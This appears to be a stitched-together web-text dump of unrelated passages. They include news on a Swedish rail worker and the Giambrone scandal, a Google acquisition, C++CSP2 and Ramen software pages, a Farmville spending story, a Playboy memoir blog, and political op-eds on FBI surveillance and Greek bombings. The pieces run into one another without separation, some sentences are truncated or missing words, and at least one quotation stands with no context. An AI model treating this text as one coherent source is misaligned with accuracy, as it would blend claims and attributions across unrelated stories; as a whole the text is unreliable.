Some 5,000 of them , using more than " 6,000 megawatt hours " of electricity each year ( equivalent to the needs of 1,250 homes ) , will then have to carry out a cumbersome audit of their carbon footprint , using " three different metrics " , in order to pay £ 12 for each ton of CO2 they emit – at a total initial cost estimated at £ 1.4 billion a year .
This will eventually be contributed by all of us , either through taxes or , for instance , whenever we visit Tesco .
A 52 - year - old rail worker ( signal operator ) in Eastern Sweden who was given a warning two years back for watching porn at work , was surprisingly given just another warning for watching porn at work using the rail computer network .
His habit over the last two years resulted in the computer network to get infected with multiple viruses that resulted in a lot of train delays .
In the two - year period since his porn habits led the administration ’s local computer network to become infected with viruses , the 52 - year - old has routinely been summoned to formal meetings with his boss to discuss his various breaches .
High speed X2000 trains , cargo trains , and regular passenger trains have all been affected by the 52 - year - old ’s relaxed approach to his job as a signal operator .
Source : www.thelocal.se
Apart from viewing porn at work , getting the computer network infested with different computer viruses , he was also a big slacker .
Aside from regularly arriving late to a job regulated by a strict timetable , the man also occasionally failed in his duty to keep train drivers abreast of the latest developments on the tracks .
One frustrated driver reported that the 52 - year - old slept soundly at his post as he awaited permission for his train to enter the station .
Source : www.thelocal.se
You would imagine that with this attitude for the last couple of years , the man would be at least fired , if not charged with the crime related to negligence .
But the Swedish Rail Administration ’s ( Banverket ) issued just a warning .
The decision at the time to issue a formal warning was not however unanimous , with two trade union representatives present at the meeting of the disciplinary board arguing that a warning was too harsh a measure .
Instead , they felt that a more appropriate course of action would have been to serve the 52 - year - old with a written reminder of his duties as a rail administration employee .

Secondly , what does it take for them to fire the guy from his position ?
Maybe they are waiting for an accident to happen !
Google has purchased Agnilux , a secretive chip house made up of engineers who architected the heart of the Apple iPad , then left the company .
Google has purchased Agnilux , a secretive chip house made up of engineers who architected the heart of the iPad , then left the company .
Reuters ' PEHub reported the story Tuesday night .
A Google spokesman also confirmed the acquisition to PCMag.com .
" We 're pleased to welcome the Agnilux team to Google , but we do n't have any additional information to share right now , " a Google spokesman said Tuesday night via email .
What is Agnilux up to ?
No one really knows .
Company executives include those from PA Semi , which in 2008 .
That team then created the A4 chip , which powers the iPad.
According to The New York Times , the team , which includes Amarjeet Gill , Mark Hayter and Puneet Kuma , was working on some sort of a server .
Dan Dobberpuhl , the chief executive of PA Semi , was reported to have led Agnilux as well , after he departed the company .
However , as a chip company , its probably reasonable to assume that Agnilux was working on a low - power architecture to drive a server , perhaps a small microserver .
That 's the road analyst firm Rethink Wireless thinks Google is heading down .
" At the other end of the scale from PA , Agnilux fits into a nascent , but potentially significant , trend , to create massive cloud server architectures based on the ARM architecture rather than Intel or specialist silicon platforms , " Caroline Gabriel wrote .
" This would reduce cost by introducing a far larger range of suppliers and developers to the rarefied world of high performance servers , argue supporters , and would address power issues . "
Potential competitors include Smooth - Stone , Gabriel said , which is working on a massively scalable ARM - based server , and Intel , which is trying to develop its
Atom cores or derivatives of such into similar scalable computing solutions .
C++CSP2
Easy Concurrency for C++
Introduction Multicore processors have arrived on the desktop , and developers are beginning to want ways of exploiting this parallelism .
The standard locks - and - threads ( or monitors and threads ) approach is easy to get wrong , and difficult to understand .
C++CSP2 is a library that provides easy mechanisms for concurrent C++ programming .
The CSP - derived approach is to eliminate sharing of data between concurrent processes .
Processes are separate pieces of code that communicate explicitly via channels .
When programming a process , you only need to consider the channel communications ( and other synchronisations , such as barriers ) , and do not need to worry about race hazards involving shared data or scheduling corner - cases .
Download
There are two bundles to choose from to download : Windows headers and pre-compiled VC ++ static libraries ( 32 - bit and 64 - bit ) , v2.0.2 .
Download this package if you want to use C++CSP2 from Visual C++ and want an easy life .
Note : the only changes from 2.0.2 to 2.0.6 were for GNU / Linux and Mac OS X , so 2.0.2 is effectively still the latest Windows version .
Source ( autotools ) package , v2.0.6 .
Download this package if you want to use C++CSP2 under GNU / Linux , Mac OS X , MinGW / MSYS , or you want to compile from source for any other compiler .
Information C++CSP2 is known to work on Windows 2000 SP4 , Windows XP 32 - bit and 64 - bit , and should work on Vista and Windows 7 and 8 ( 32 - and 64 - bit ) .
C++CSP2 works on x86 and x86 - 64 processors on GNU / Linux ( 2.6 kernel using NPTL recommended ) .
C++CSP2 also works on Mac OS X ( since 2.0.3 ) .
C++CSP2 does not work on the BSD operating systems .
C++CSP2 is licensed under the GNU Lesser General Public Licence ( LGPL ) .
C++CSP2 replaces C++CSP v1 and makes many changes to the API .
For users who want to migrate from C++CSP v1 to C++CSP2 , a migration guide is provided in the documentation .
Repository
The source repository for C++CSP2 is now publicly available via Subversion .

Though online games like World of Warcraft have gotten plenty of bad press for being “ addictive , ” at least the financial ramifications are limited to $ 14.99 a month – well , unless you ( a ) lose your job because you play too much , or ( b ) break the game ’s TOS and pay for your gold .
So what about the new craze of casual games , particularly the ones played on Facebook , that are n’t pay - per - month but rather pay - for - content ?
You may recall that there have been some issues with scam advertisers in Farmville and other Zynga games , a side effect of the business model that allows players to earn coins to purchase content by signing up for free trials from advertisers .
But another way of getting more and more Farmville stuff ( like land , crops , animals , etc. ) is just to pay for it – e.g. , $ 5 for 7,500 coins .
But how much virtual farming goods could you possibly buy in a couple of weeks ?
Try £ 900 – or about $ 1400 USD .
A UK woman discovered last month that her 12 - year - old son first emptied his own savings to pay for about a third of that , and then ran up the rest of the debt on her credit card .
And this was only in about two weeks , starting on March 14 and going on until the end of the month when the mom discovered the charges .
Unsurprisingly , there is n’t much the mom can do about it , since the only way she would be able to get her money back from the credit card company would be to report it stolen ( and I guess she does n’t think her son deserves that hard of a lesson ) .
Facebook suspended the kid ’s account , and Zynga helpfully suggested she try using passwords on her computer .
It was unclear from the media report whether the kid stole his mom ’s credit card without her knowledge or if he ’d just used it for something she had n’t given him permission for – I ’d assume the former , since giving a 12 - year - old a credit card number does n’t seem like a great idea .
And speaking of his age , it is actually against Facebook ’s TOS for anyone under 13 to have an account .
Whether this says something about Zynga ’s business practices in general , I suppose it serves as a cautionary tale to parents .
Kids ( typically ) do n’t have a great head for finances , especially when what you ’re buying is virtual – heck , there are plenty of adults playing games like Farmville that find themselves surprised by how much it costs .
And this kid ’s reason for spending so much ?
“ They had brought out good stuff that I wanted . ”

My First
This post is going to be a slightly weird one .
Given some of the things I write about , that 's saying something .
Most of the guys are going to get this .
Any women reading it probably are n't .
No offense intended , but we are a vastly different people and the general course of our childhood years are completely different .
Though , if a woman were to read it carefully enough , she might better understand men .
And how freaking messed up we really are .
Seriously ._ _ _ _ _ _ _ _ _
_ This morning , I was surfing through my daily sites , doing a sort of stream of consciousness thing letting one site link me to another and then another and so on .
Warning :
This is not for the faint of heart .
There is some SCARY shit out there in the interwebs .
Trust me .
Anyway , I was roaming through links and posts when I saw something that looked mildly interesting .
It was a retrospective piece on the changing face of print media through the decades with a particular focus on the evolution of cover layout .
At least , that 's the story I prepared for Susan .
It was actually pictures of every cover of the Playboy Christmas issue ever .
Then , as I scrolled through them ( purely for research purposes , of course ) , something incredible happened .
It was sixth grade .
A group of my friends were crowded into a makeshift hideout we had constructed .
Mostly , we just hung out and talked video games and theorized exactly what parts girls had and what we were supposed to do with or to them ....
It 's a guy thing .
That 's when one of my friends ran in .
To say he looked excited would be an utter insult to the meaning of the word .
He was practically flying .
We instantly knew something big was happening .
Maybe it was that look in his eye or the the way he ran in almost breathless .
Maybe it was the way he was clutching his backpack like he'd just robbed a bank .
I was reasonably sure he had n't just robbed a bank .
While he was a nice guy , he was n't exactly the sharpest spoon in the drawer .
His IQ rivaled that of a grilled cheese sandwich .
Still , there was something going on .
Something big .
He carefully unzipped his pack and reached inside like a doctor doing a Caesarean .
The care he took doing this made us all hold our breath .
He slowly pulled his hands out and , clutched in his sweaty little fingers , were pages torn from his father 's Playboys .
Jackpot .
Before any of the females reading this get confused , let me explain .
To a boy at age 11 , pages from a Playboy are practically religious , something to be studied and obsessed over .
No , obsessed is not in quotation marks .
Any man that tells you he never looked at a Playboy at that age is either : a ) a liarb ) a damned liarc ) please refer to a and bYou have to remember that this was a time before the internet had caught on and you did n't have instant access to the myriad databases of wildly varied porn that it brought with it .
Today , it takes three seconds to find 800 pictures of naked women .
Back in my day , that had to be earned .
Basically , the only exposure we had to nude women was through stolen Playboys or carefully paused scenes in movies .
This ...
This was a treasure trove of beautiful artwork , a cache of artfully displayed female form .
Also , boobs .
He went from being a practically useless member of the group to near mythological stature .
We practically bowed at his feet , waiting to share in his knowledge .
Then , as dutifully as one could imagine , he carefully distributed the pages to the group .
Each boy received one and were careful not to question their portion lest he tear it out of their hand .
I can still remember the page he handed me .
I honestly can't remember what I had for lunch yesterday , but I remember that moment with such glaring detail that it's a little frightening .
I could tell you what each boy was wearing and even what the air smelled like .
That page became a priceless artifact to me .
I hid it in my room to protect it from my mother 's prying eyes and would carefully study every detail .
The images were practically burned into my brain .
The only thing I did not know was the woman 's name .
During the no doubt Ocean 's Eleven - ish theft , he was not afforded the luxury of picking and choosing what to take .
All I had was a single page , back and front printed with images of this nameless woman .
At some point through my life , the page was lost .
Either during a move or perhaps discovered and quietly destroyed by my mother .
It was gone .
Fastforward to this morning .
As I was scrolling through this somewhat interesting , but albeit mundane archive of covers , I saw her .
It was the same face , the same eyes that I had spent hours staring at as a young man .
Just staring .
Honestly .
This might not seem like a big thing , but it really hit me for a loop .
The memory of those pictures had been lost to time , buried in years of non -boob related events .
And then , there they were .
And I finally learned her name .
Kata Karkkainen .
I could finally put a name to the face .
I said face , dammit .
This morning was a true testament to two very important facts : 1 ) it is incredible what a simple image can mean to a young man2 )
I have WAY too much time on my hands
Unwinnable wars in Iraq and Afghanistan , enormous expansion of federal health regulations , indefinite detention , targeted killing of American citizens , bungled government responses to environmental disasters , warrantless surveillance and bailouts galore .
Are we sure George W. Bush is no longer president ?
Barack Obama ’s administration now wants to be able to see the headers on all e-mails that you send , even if there is no probable cause , no warrant , no judicial oversight and no disclosure to you or anyone else that the FBI even peeked .
As far as I can tell , Obama ’s bill modifying the Electronic Communications Privacy
Act would allow the FBI to secretly track information in the from , to , carbon copy and subject fields , among others .
The bill would likely also include the history of web sites you visit .
Free Your Inner Yankee Philip Maymin Best Price : null Buy New $ 11.95 ( as of 03:00 EST - Details )
I use terms like likely  and as far as I can tell  not only because the language is vague — it would merely insert the four words electronic communications transactional records  into an ever - growing list of exclusions the FBI can rely on to avoid getting a warrant — but also because there does n’t seem to be any plausible way to object , review , or punish an overbroad or unnecessary FBI investigation .
Meanwhile , just try and find the analogous records between people who communicated with Bush and those who communicated with Obama .
Why is it that the two administrations are so similar ?
Who is pulling the strings ?
What information could possibly be more important to American security than knowing why two seemingly different individuals continue to pursue the same big - government policies ?
Yankee Wake Up Philip Maymin Best Price : $ 4.95 Buy New $ 8.95 ( as of 02:35 EST - Details )
Yeah , good luck with that .
The law is intended as a one - way peep show only , and we are the ones on a stage with a pole .
One often hears claims that this law or that law will have a chilling effect on free speech .
The term was part of a 1965 Supreme Court decision striking down an odd postal service law requiring anybody receiving communist political propaganda to specifically authorize receipt before the post office would deliver it .
Speech was iced : people could not say what they wanted to say .
In a sense , the law was a kind of prior restraint on speech , which is unconstitutional .
How does effectively cc-ing your emails to the FBI and letting them snoop around your browsing history cause a chilling effect ?
Here ’s one example .
Try to fact check the assertion in the first sentence that Obama continues to approve the targeted kill program to authorize an assassination of anybody on earth , including an American citizen like you , at any point in time , even using an unmanned drone , if he decides you are an imminent threat .
Perhaps you might resort to Google , but with what search term ?
Bear in mind that your search is part of the web address .
If you search for  Obama ,  your address bar will say q=OBAMA  somewhere in there .
That information is likely part of your electronic communications transactional records .
Say hi to your local federal agent .
How comfortable would you feel searching for the term  Obama target kill ? 
The FBI may decide to share your name with the Secret Service , under their better safe than sorry  doctrine .
And when the president also claims the right to assassinate anyone without due process , you may not even have time to regret the loss of your judicial rights if you are deemed an imminent threat .

Greece bomb hits Pakistani leader ’s home in Athens
It was the second blast police responded to in as many days
A bomb has exploded outside the home of a Pakistani community leader in the Greek capital Athens – the second blast in the area in less than 24 hours .
Police said there were no injuries , but some damage was done to the entrance of the apartment building and three cars .
On Friday , a bomb damaged the office of a far - right anti-immigration group .
No group has said it carried out the attacks , but there have been numerous bombings attributed to far - left or anarchist groups in recent years .
Recent attacks have targeted banks and government buildings .
Greece has faced severe anti-government protests and rioting since police shot dead a teenager in December 2008 .
Completely ignoring the fact that bomb attacks are going on for a moment , let me just take the time to point a few inaccuracies and shady imputations in the above article .
Firstly , I ’d like to point out the use of the sanitised description of the Golden Dawn as ‘ a far - right anti-immigration group . ’
For a start , any one who has read my blog in the past will know that the Golden Dawn is an ultra-nationalist fascist organisation that routinely attacks immigrants , Anarchists , and individuals in general opposition to their platform .
They are notoriously violent and have been known to have murdered people in the street for throwing away their pamphlets .
Second , the following paragraph mentions that so far no group as claimed responsibility for the attacks , but oh so politely mentions that far - left and Anarchist ( read : murdering , rapist , baby - snatching , shit crazy Anarchist thugs ) have carried out ‘ numerous ‘ bombings in recent years .
This is a technique that triggers the reader to jump to a conclusion , or , ‘ fill in the blanks ’ ; it positively must have been those satanic Anarchists attacking the Pakistani community leaders house .
Never mind that the far greater likelihood is that those who attacked the Pakistani community leader ’s house are the un-named Golden Dawn carrying out reprisals .
Thirdly , the use of the phrase ‘ police shot dead a teenager ’ is ambiguous .
Sure , its background information , but it does n’t provide the context ; two police officers murdered a teenage boy .
Yeah , that ’s no reason for those silly Greek peasants to be angry .
UPDATE : Taxikapeli , reporting on LibCom.org writes ,
The bomb attacks come after more than a month of a lull by urban guerrilla groups which has launched a winter offensive during December and January .
It must be noticed that the small bomb that hit the house of the vice - president of the Pakistani community yesterday is widely considered to be related to the Pakistani secret services ( due to the fact that it has been proceeded by the assassination of an embassy official of Pakistan ) and not to domestic armed struggle .
" To each and every question I would ask her , other than her name , she asserted the Fifth , even after I told her that everybody else had come in and fully cooperated and provided complete testimony as to what took place , " Haltzman said .
One answer is that these employees may care , often subconsciously , about things besides pay .
The most productive workers in a group , for example , often appear to value their status , perhaps because they enjoy greater self - esteem and respect than the least productive workers .
To bid successfully for the high achievers , a rival employer might not only have to increase their pay , but also place them in a group where they continue to enjoy a high ranking .
In a free market , however , no one can be in the top half of any group unless others agree to be in the bottom half .
And if people prefer not to occupy low - ranking positions , filling these positions would require extra compensation .
The rival ’s offer , then , would resemble the original pay pattern .
The upshot is that top - ranked workers may well stay put .
The high ranking they enjoy is more than enough to offset their sacrifice in pay .
Similarly , their less productive co-workers may find it onerous to be at the bottom of the ladder , but they are compensated for that fact by their premium wages .
So , in effect , private markets are already applying an implicit progressive tax in the way they pay workers .
And , in the process , they serve the interests of everyone in the hierarchy .
The alternative would be costly social fragmentation .
CAN anyone doubt that high rank has value , not just among groups of co-workers but also in society ?
For starters , high - ranking members of society , who also tend to have the highest incomes , know they will be able to send their children to the best schools and have access to the best health care .
Low - ranking members enjoy no such confidence .
It ’s much harder , of course , to organize new societies than to start new businesses .
But that does n’t mean high - ranking positions in the real world should be available at no cost .
They are possible only when others bear the costs associated with a low social ranking .
To celebrate its homegrown hero , Rhode Island governor Donald L. Carcieri proclaimed today to be " G.I. Joe Day . "
And to help you celebrate , here 's a quickie 5 Neat Facts about G.I. Joe , only from Neatorama :
1. G.I . Joe owes its existence to Barbie .
That 's right - in 1963 , toy creator Stan Weston thought that since Barbie was so popular , he could come up with a similar toy for boys : a line of Barbie - sized dolls with military theme to be marketed for boys .
He brought the concept to toy manufacturer Hassenfeld Brothers ( who later shortened the name to Hasbro ) .
Three prototypes were created : " Rocky the Marine " , " Skip the Sailor " , and " Ace the Pilot . "
2. G.I. = " Government Issue "
3 . The name G.I . Joe itself came from a 1945 American war film called The Story of G.I. Joe , starring Ernie Pyle and Robert Mitchum .
Four original G.I.
Joe action figures released in 1964 , plus the black soldier who followed in 1965 .
Source : Hasbro
4. World 's First Action Figure .
Because they thought that boys would n't play with dolls , Hasbro coined the words " action figure " to market the toy .
5 . The first G.I. Joe product , G.I. Joe : America 's Moveable Fighting Man has 21 points of articulation , which is actually patented .
6. G.I . Joe has a scar across his right cheek .
This enables Hasbro to copyright its toys , because otherwise the human figure itself cannot be copyrighted .
7 . In 1967 , Hasbro introduced its first female Joe : G.I. Nurse Action Girl .
It was a spectacular failure ... and is now one of the world 's most sought - after collectible :
In 1967 , Hasbro expanded the line to include a series of talking figures , and Hasbro Canada produced a Canadian Mounties set .
That year also saw the release of the fabled G.I. Nurse Action Girl , a doll so rare that certain models mint - in - box can bring up to $ 6,000 on today ’s collectors ’ market .
" The G.I. Joe Nurse is so valuable today because it was released for only one year , " says Sharon Korbeck , editorial director of Toy Shop , a biweekly magazine aimed at toy collectors .
" The figure did n’t do very well because boys were n’t interested in a female doll , and girls were n’t interested in anything related to G.I. Joe . "
Sales also suffered because toy store managers did n’t know how to position the doll .
Some put her with the G.I .
Joe action figures , while others stocked her next to Barbie and her friends .
Either way , 50 % of the prospective market was lost .
8 . In the wake of the Vietnam War , Hasbro dropped the military - theme and rebranded the line as " Adventure Team . "
9. Bullet Man , the weirdest G.I. Joe ever
From Plaidstallions , which has a lot more fun G.I .
Joe catalog pages from the 70s
In 1976 , to compete with the superhero toy craze , Hasbro added a superhero to its G.I .
Joe line up : Bullet Man , the Human Bullet .
Collectors did n't like it then ( Joe 's enemy was a caveman from outer space ! ) , but given its rarity , Bullet Man is now highly valuable .
10 . " Knowing is Half the Battle " - The G.I . Joe catchphrase came from its cartoon series in the 1980s .
At the end of each episode , there was a public - service message showing kids in a situation where they did something wrong and Joes giving advice .
The PSA always ended with the phrase " Now we know ! "
" And knowing is half the battle ! " Joe Headquarters has a list of these PSAs .
If knowing is half the battle , what 's the other half ?
Your choices are " unbridled violence , " porkchop sandwiches , or this T - Shirt from Nerduo .
There is less than a handful of free compositing tools around , and Ramen sounds like a very promising project .
In this tutorial we introduce you to basics of using it .
As Wikipedia states ,
Compositing is the combining of visual elements from separate sources into single images , often to create the illusion that all those elements are parts of the same scene .
Live - action shooting for compositing is variously called " blue screen " , " green screen " , " chroma key " , and other names .
Today , most though not all compositing is achieved through digital image manipulation .
Pre-digital compositing techniques , however , go back as far as the trick films of Georges Melies in the late 19th century ; and some are still in use .
In other words , compositing is a way of merging and filtering moving pictures .
Compositing applications can be roughly classified as :
Layer - based .
Composition is a set of overlayed images and filters .
This is used for simple effects and video graphics and mostly used on TV and commercials .
Node - based .
Composition is created from image sources , filters and other procedures as graphs / nodes that are interconnected .
Provide much more freedom and are used for feature films to create huge compositions with lots of elements .
There is a number or rather good and not so good commercial / proprietary solutions for compositing , off - top of my head :
Apple Shake ;
The Foundry Nuke ;
Autodesk Combustion ;
Eyeon Fusion ;
Adobe After Effects .
Free open source sofwtare users do n't have much choice .
Until very recently existing solutions were :
Blender : its built - in composer looks quite good until you start using it seriously , which is where you discover that it 's quite slow , that you need to create Viewer nodes all the time , that animation tools lack simple functionality ( like Time and Translate nodes not being able to shift an image by half a pixel ) .
Besides it crops an image that goes outside visible area .
I do n't even mention rotoscoping ( vector masks ) and other pitfalls .
Synfig Studio : even though this application is designed with feature film quality 2D animation graphics in mind , some compositing tasks can be accomplished easily .
And since it 's really all about vector animation , rotoscoping is no problem at all .
Besides Synfig 's rendering engine handle large resolutions quite well ( remember the feature film bit , eh ? ) .
The main disadvantages are a small set of effects and no being able to work on extra channels like depth , speed and other cunning things .
Synfig organizes elements into a tree , so you can use it as a kind of substitute to Adobe After Effects .
Cinelerra : works on layers , has more or less functional rotoscoping and nice filters .
Still , I 'd rather not do any production level compositing with Cinelerra .
GAP : GIMP Animation Package can do it too , but in a destructive manner , since any source image is physically changed after application of a filter .
And then Ramen came out of blue .
The How and The Why
Our savior 's name is Esteban Tovagliari who 's been working in CG and commercials as composer professionally for over 10 years .
Having started programming at the age of 15 ( and loving it ) , he later created a number of image processing tools to accomplish his daily tasks at work .
However all of them had command - line user interface which was n't really efficient , because one had to export , process , import back , check , start all over again and so on .
This is why Ramen was started .
About a year ago Esteban gave a couple of copies of the application to his friends and work mates and then figured out that by opening source code he could make a contribution to open source world in general .
Especially since Apple was planning to ditch Shake and Adobe and Autodesk were sort of going astray .
And thus Ramen was reborn as an open source project at SourceForge .
Installation
I 'm saying this with a straight face : there are no builds for Windows .
Yet .
Some first steps towards it have already been done , but what with one thing and another Esteban never really found time to install a third operation system and support a build for it .
What you can download from the project 's page are Linux and Mac builds .
Right about the time we published this article , new builds were uploaded , so you , our lucky firsts readers , can still beat the rush for the latest and greatest .
However if you feel like watching evolution of the project from the first row , you can use SVN .
And that 's where things go interesting , because Ramen heavily relies on third - party libraries , so it 's all about dependencies again .
Which is quite excusable when you think about how many people ( just one ) are currently involved in the project as developers .
So the magic command to fetch copy of SVN repository is :
svn checkout https://ramenhdr.svn.sourceforge.net/svnroot/ramenhdr/trunk ramenhdr
You need to check the list of libraries required to build Ramen , which you can find in INSTALL.
txt .
At the moment of publishing the article the file was n't mentioning that you need boost 1.42 to build Ramen with GCC 4.4 compiler ( that 's because earlier versions of boost 's GIL library and this particular version of GCC get along like a house on fire ) .
If you are Ubuntu user , you are even more lucky , because yo can use nightly builds from Eibriel 's PPA .
You will also need a rather modern videoadapter that is also not of Intel persuasion ( you really want float textures supported ) .
On my GeForce 8200 Ramen runs just fine .
Basics
If you never used a compositing application before , you might like to know basics of creating a node - based composition , before you face Ramen .
And those are :
You start with creating one or multiple image sources , such as Color , Color Bars , Gradient , Image nodes ( supports TIFF , SGI , TGA , PNG , JPEG , HDR , EXR , DPX and CIN ) , Mandelbrot ( fractal ) node , Noise node ( useful for dithering ) or Quick Shape node ( vector mask for rotoscoping ) .
Then you add a number of filtering and mixing nodes .
After that you create a desired amount of output Image nodes ( same file formats supported as for input Image node ) .
Finally you connect inputs and outputs with wires .
Got it ?
And now let 's have a look at Ramen :
Most of the screen estate is used for composition preview .
Below are two windows grouped into tabs : a composition tree view ( active by default ) and animation curves editor .
The right sidebar contains editor of selected node 's settings .
Nodes are created from Create menu and connected by dragging a pointer from input / output of one node to input / output of another node .
To remove connection wire just click it while pressing Ctrl key .
Output is always marked with a yellow square , back / front inputs are green and red correspondingly , and matte is blue :
An active node , whose settings are in settings editor , has a red frame around it .
A node currently displayed in preview area has a blue frame .
Selected nodes also have a yellow background .
To activate a node double - click it .
By default preview area displays the currently active node , so if you want to edit one node and preview another ( e.g. to see how changes in one node affect the whole composition ) , switch mode from Active to Context in the preview area .
After activation of Context mode double - click the node of interest with Ctrl key pressed and you 'll get preview from that node .

A simple example of using Ramen
Idea
OK , now that you know , where is what , let 's do a simple composition : a brutal Linux console , which is filled with ink spots and fades to linuxgraphics .ru logo ( which is the website the article is originally written for ) .
Here is the final video to make :
Source materials
Video of Linux loading was recorded with VirtualBox and xvidcap .
This video features a compact and nice SliTaz distro .
Ink spots were created using Indian ink , pipette , paper , scanner and GIMP .
The logo , of course , was borrowed from linuxgraphics.ru .
Bootload screencast
Before starting anything I actually rearranged UI by dragging dockers around and started creating the composition :
Ramen cannot show where borders of a frame currently are yet , so I 'm using a well - known old trick : a bright background of a required size created with Color node .
So now I can see how exactly to stretch the image .
Ink blobs
Let 's add the ink blobs I already scanned .
Ramen determines them as a sequence of frames , which is not exactly what we want .
Luckily there is a very useful Slip field and a Lock checkbox among image_in 's settings which allow defining a particular frame of the sequence and switch off change of frames .
And now let 's invert the image with invert node , then send Red channels to Alpha channel using setch node ( in the inspector on the illustration below ) , then multiply the resulted image with desired color using layer node .
While at that , define image size for color node so that our blob mask fills it entirely .
Now add move2d node to reposition blobs on the image and place them above the video of the console .
Change position of nodes to make things look nicer :
Repeat the above operation several times and you 'll be blown by a hurricane of color :
At this stage rendering already takes some time , so lowering resolution comes as a natural solution .
Use the Full / Half / Third / Quarter toggle on the image panel .
With " Quarter " options chosen the composition will be rendered in realtime mode or close .
It is time to fade to white now .
This transition is also cool , because you can press Ignore button on the layer node and thus discard everything we just did with blobs .
Here is where I thought about the whole thing again .
The initial plan was to make blobs appear by raising their opacity .
Bit then I thought : why not use a blurred mask to animate smooth fading in of the blobs .
( Just a footnote : experiments like that in layer - based compositors are not so easy . )
Let 's animate Offset option of the correct mode .
The node layer_115 here multiplies source mask with a new one .
And the setch node here is configurable to send Red channel to all channels instead of duplication of correct node 's options for all channels .
And the result looks quite neat , eh ?
Now the change should be applied with the right timing to all blobs .
Since Ramen does n't have decent retiming functionality yet , it 's best to think about it beforehand .
This might possibly involve pencil and paper :)
After application of this technique the tree grows larger :
And after duplication of blobs it does n't look like tree anymore :
Let 's make sure that this part of the composition works as expected by rendering and checking it , and then we can toggle off the layer node to work on the white background further .
Logo
The source logo file was in SVG , so I separated it into several elements in Inkscape and then additionally exported the whole thing to simplify the assembly .
Now let 's add the logo .
Since Inkscape does n't premultiply while exporting to PNG , we 'll have to do it in Ramen .
Now let 's place all the elements where they belong and get another staircase :
All that is left to do now is animation with Scale option in move2d node 's settings .
If you want more bling in the composition , you can add blurring of the blobs during transition :
The final video
And here is the resulted video again :
The original Ogg Theora file is here .
Sources
You can download composition sources from here .
Ramen uses absolute paths .
Since it makes sharing projects a little painful , I wrote a small Python script called pathfix .py and put it in the tarball .
Go to the directory with decompressed composition and execute the script ( $ python pathfix.py ) .
Right after that you can open compos.rmn in Ramen .
Conclusions
Advantages :
usable rotoscoping tools , whee !
decent user interface ;
built - in flipbook ;
high performance despite of author 's claims that code was never optimized ;
fully working ( unlike Blender 's ) system of resolution control for preview ;
almost all node settings can be animated ;
basic OFX support , which means you can use plug-ins for Nuke , Toxik , Fusion etc. ; it 's currently disabled in binary builds for being buggy , but can be re-enabled if you compile Ramen yourself ;
Disadvantages :
some memory leaks ( being currently worked on ) .
no on - canvas controls ( soon to be fixed , as claimed by Esteban )
poor retiming functionality ( you cannot simultaneously scale / move multiple curves of different nodes yet )
no tracking and match moving tools .
no nodes palette , adding new nodes from menu is n't exactly comfy .
To summarize it all , what we see here is a project with a very rapid start and fast development .
And even though Ramen is not ready for projects with deadline yet , it is currently the most likely open source rival to commercial compositing solutions .
With a larger team the project could easily become a serious PITA for the big guys .
Plans for future
Everything in this article relates to revision 128 from SVN .
Ramen really becomes better with every single commit , so reading the whole article could be a waste of time if you was n't told where things are heading to .
Short - term goals are fixing most depressing bugs , making the application more robust and easy to use , and also finishing OFX support .
As for long - term goals , the way Esteban sees them , it 's rather about creating a feature set comparable to Shake's .
And this means motion tracking , really good rotoscoping , vector paint ( a - la Shake 's paint node ) , scripting and all sorts of optimizations .
What now ?
Esteban has a development blog ( also syndicated by Graphics Planet ) .
Since recently there also is a forum and there is a Vimeo group dedicated to Ramen now .
Here is a keying test video , for example :
The project will be applying to participate at Google 's Summer of Code 2010 .
The list of possible projects is here .

Adam Giambrone ’s meteoric rise through Toronto politics crashed dramatically after he apologized for a sex scandal and an aide pronounced : “ His mayoralty campaign ends today . ”
The unbelievable scene in a City Hall committee room was triggered by a sex scandal broken Tuesday morning in the Star , and followed a day of denials and then an admission that he lied to the newspaper over his relationship with a university student and in fact has had multiple affairs .
Looking uncharacteristically haggard , the tall , baby - faced TTC chair stepped to a microphone in front of dozens of journalists and began : “ There are weeks that change your life and this one has certainly changed mine .
“ This searing experience has taught me , permanently I hope , that a public career of integrity cannot survive deceit in your private life , ” he said .
Giambrone then offered an apology to his live - in girlfriend Sarah McQuarrie , his family , friends , supporters , the “ women I have treated disrespectfully ” , his council colleagues and to the “ young people who believed in me .
“ It is my sincere hope that they will continue to believe in themselves and their ability to make positive change , ” he said .
Hi continued : “ Finally , I deeply apologize to my partner Sarah .
The pain she has endured for my mistakes was deeply unfair to her .
She has shown a lot of strength in all of this . ”
He then said , “ Thank you , ” and , as reporters hurled questions about the fate of his 10 - day - old mayoral campaign , turned and walked out the door , into a stairwell and down toward the parking garage with a phalanx of city staffers and security guards around him .
Later , insiders suggested he was mistakenly handed just one page of his two - page speech .
A short while after the one - minute , six - second appearance , his executive assistant , Kevin Beaulieu , returned and told confused reporters :
“ In the emotion of the moment Adam was unable to finish the statement and I will read it to you on his behalf . ... ”
Beaulieu said Giambrone is going to reflect on the advice he is getting .
“ He will spend the next few days in private ; his mayoralty campaign ends today , ” the aide said .
“ Beginning next week he will return to his normal duties as city councillor .
He will focus with renewed energy on the transformation of the TTC and on building Transit City for the people of Toronto .
Adam would like to thank all his friends and his supporters who have helped him through these painful days . ”
Last week , after a profile of Giambrone by the Star ’s Linda Diebelthat included McQuarrie , Kristen Lucas , 20 , contacted the paper to say she had an affair with Giambrone that started in late 2008 when she was 19 .
She said it included late - night sex on his City Hall couch , text messages portraying McQuarrie as window - dressing for his political career and Giambrone telling her about a TTC fare hike long before it was made public .
Giambrone initially admitted an “ inappropriate relationship ” with her but said it was limited to text messages and public outings .
On Tuesday night , faced with mounting evidence he had lied , Giambrone admitted to multiple relationships in the past year .
In a statement to the Star he said he had “ broken my own moral code and offended the values I was raised with by my parents ... I apologize to those I have hurt by my decisions .
In the period ahead I pledge that I will do everything possible to live by the lessons learned in this scarring experience . ”
Reaction from Giambrone ’s stunned colleagues was a mixture of regret for a young , promising career so publicly damaged , concerns over his continued chairmanship of the already reeling TTC , and speculation over how this affects the mayoral race .
Mayor David Miller , in Ottawa for a municipalities ’ meeting , issued a terse news release stating : “ Councillor Giambrone ’s decision to leave the mayoralty race is regrettable .
His voice and the vision he could have brought to this important campaign will be missed but his decision to focus on his private life and his current duties is understandable . ”
Deputy Mayor Joe Pantalone , who was Giambrone ’s rival mayor candidate from Miller ’s left - wing faction of council , said it ’s “ not a happy moment to for anybody who is young and smart and up and coming and willing to contribute to fall this way . ”
But Pantalone said there is no need for Giambrone to step away from the TTC , which is reeling from rider discontent and embarrassing photos and videos of workers .
“ We can not kick somebody who is down – it is not the human thing to do , it is not the Torontonian thing to do .
Let him get up and learn from his mistake .
